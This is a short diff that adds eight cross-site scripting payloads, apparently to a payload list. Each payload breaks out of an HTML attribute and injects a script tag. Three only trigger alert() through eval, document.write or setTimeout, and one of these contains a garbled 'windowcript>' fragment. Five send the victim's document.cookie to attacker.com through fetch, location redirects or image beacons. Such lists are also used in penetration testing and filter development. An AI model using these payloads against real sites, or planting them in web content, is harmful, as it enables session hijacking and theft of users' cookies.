@@ -1,0 +1,8 @@
+"><script>eval('alert(1)')</script>
+"><script>document.write('<img src=x onerror=alert(1)>')</script>
+"><script>windowcript>setTimeout('alert(1)', 1)</script>
+"><script>fetch('//attacker.com/?c='+document.cookie)</script>
+"><script>location='//attacker.com/?c='+document.cookie</script>
+"><script>document.location.href='http://attacker.com/'+document.cookie</script>
+"><script>new Image().src='http://attacker.com/log?c='+document.cookie</script>
+"><script>var i=new Image;i.src='http://attacker.com?'+document.cookie</script>
